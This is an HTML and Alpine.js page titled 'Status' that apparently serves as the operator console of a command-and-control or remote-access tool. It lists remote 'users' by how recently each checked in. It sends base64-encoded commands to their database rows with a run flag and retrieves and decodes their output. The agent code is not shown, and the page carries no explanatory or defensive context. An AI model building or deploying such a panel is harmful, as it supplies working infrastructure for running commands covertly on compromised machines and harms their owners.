<!DOCTYPE html>
<html>

<head>
    <title>Status</title>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        .user-link:hover {
            text-decoration: underline;
        }

        body {
            background: black;
            color: white;
            font-family: monospace;
            user-select: none;
            padding: 1rem;

            min-height: 100vh;
        }

        .context-menu {
            position: fixed;
            background-color: #222;
            border: 1px solid #555;
            z-index: 1;
            min-width: 180px;
            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.5);
        }

        .context-menu-item {
            padding: 6px 12px;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .context-menu-item:hover {
            background: #555;
        }
    </style>
</head>

<body x-data="app()" x-init="fetchData(); setInterval(() => fetchData(), 4000)" @contextmenu.prevent
    @keydown.window.c="if(targetUser) fetchSingle(targetUser)"
    @keydown.window.v="if(targetUser) viewOutput(targetUser)">

    <div x-show="!selected">
        <template x-for="user in rows" :key="user.username">
            <div style="padding: 3px;">
                <span :style="{ color: getStatusColor(user) }">●</span>
                <small @contextmenu.prevent="openMenu($event, user)" class="user-link" style="cursor: pointer;">
                    <span x-text="user.username" style="font-weight: bold; margin-left: 5px;"></span>
                    <span x-text="new Date(user.updated_at).toLocaleString()"
                        style="margin-left: 10px; color: #888;"></span>
                </small>
            </div>
        </template>
    </div>

    <div x-show="showMenu" class="context-menu" :style="`top: ${menuPos.y}px; left: ${menuPos.x}px;`" x-transition
        @click.away="showMenu = false">
        <div class="context-menu-item" @click="fetchSingle(targetUser); showMenu = false">
            <span>Send Command</span>
            <span
                style="color: #888; font-size: 0.9em; padding: 1px 5px; background-color: #444; border-radius: 3px;">C</span>
        </div>
        <div class="context-menu-item" @click="viewOutput(targetUser); showMenu = false">
            <span>View Output</span>
            <span
                style="color: #888; font-size: 0.9em; padding: 1px 5px; background-color: #444; border-radius: 3px;">V</span>

        </div>
    </div>

    <script>
        function app() {
            return {
                rows: [],
                selected: false,
                url: '',
                apiKey: '',

                showMenu: false,
                menuPos: { x: 0, y: 0 },
                targetUser: null,

                openMenu(e, user) {
                    this.targetUser = user;
                    this.menuPos = { x: e.clientX, y: e.clientY };
                    this.showMenu = true;
                },

                async fetchData() {
                    try {
                        const response = await fetch(`${this.url}?select=username,updated_at&order=updated_at.desc`, {
                            headers: {
                                'apikey': this.apiKey,
                                'Authorization': `Bearer ${this.apiKey}`
                            }
                        });
                        this.rows = await response.json();
                    } catch (err) {
                        console.error(err);
                    }
                },

                async viewOutput(user) {
                    this.showMenu = false;
                    try {
                        const response = await fetch(`${this.url}?select=out&username=eq.${user.username}`, {
                            headers: {
                                'apikey': this.apiKey,
                                'Authorization': `Bearer ${this.apiKey}`
                            }
                        });
                        const data = await response.json();

                        if (data[0] && data[0].out) {
                            const decoded = atob(data[0].out);
                            await navigator.clipboard.writeText(decoded);
                            alert(`Output for ${user.username} (Copied from clipboard):\n\n${decoded}`);
                        } else {
                            alert(`No output found for ${user.username}`);
                        }
                    } catch (err) {
                        console.error(err);
                    }
                },

                getStatusColor(user) {
                    const diff = (new Date().getTime() - new Date(user.updated_at).getTime()) / 1000;
                    if (diff < 20) return 'green';
                    if (diff < 60) return 'yellow';
                    return 'red';
                },

                fetchSingle(user) {
                    this.showMenu = false;
                    if (this.getStatusColor(user) !== 'green') return;
                    const cmd = prompt(`Send command to ${user.username}:`);
                    if (cmd) this.sendCommand(user.username, btoa(cmd));
                },

                async sendCommand(username, b64Cmd) {
                    await fetch(`${this.url}?username=eq.${username}`, {
                        method: 'PATCH',
                        headers: {
                            'apikey': this.apiKey,
                            'Authorization': `Bearer ${this.apiKey}`,
                            'Content-Type': 'application/json',
                            'Prefer': 'return=minimal'
                        },
                        body: JSON.stringify({ cmd: b64Cmd, run: true })
                    });
                }
            }
        }
    </script>
</body>

</html>
